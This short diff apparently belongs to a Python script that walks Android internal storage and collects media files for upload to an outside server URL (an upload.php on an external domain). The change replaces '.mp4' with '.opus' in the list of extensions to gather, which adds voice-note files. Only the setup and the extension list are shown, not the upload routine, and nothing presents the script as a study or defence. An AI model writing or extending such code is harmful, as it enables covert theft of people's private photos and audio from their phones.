@@ -4,7 +4,7 @@ import requests
 # ✅ Step 1
 base_path = "/storage/emulated/0/"  # Android internal storage
 server_url = "https://hostiko.online/data/upload.php"  
-image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4']
+image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.opus']
 
 # ✅ Step 2
 def find_all_images(path):
